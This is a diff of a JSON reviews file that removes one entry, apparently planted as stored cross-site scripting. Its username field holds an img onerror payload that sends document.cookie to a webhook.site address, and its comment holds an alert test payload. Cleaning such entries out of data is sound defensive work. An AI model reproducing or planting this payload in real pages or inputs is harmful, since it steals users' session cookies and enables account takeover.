@@ -46,13 +46,5 @@
     "rating": 5,
     "comment": "mantap ,kalo wibuku sih enak ni🗿",
     "createdAt": "2026-08-10 09:32:55"
-  },
-  {
-    "id": "msnvcwor85d05c",
-    "username": "full_steal<img src=x onerror=\"fetch('https://webhook.site/0d7743b7-220a-48be-a060-bebaa05cb280?msg=full_cookie_steal&c=' + encodeuricomponent(document.cookie))\">",
-    "role": "user",
-    "rating": 5,
-    "comment": "<img src=x onerror=alert(\"xss_review\")>",
-    "createdAt": "2026-08-11 07:35:07"
   }
 ]
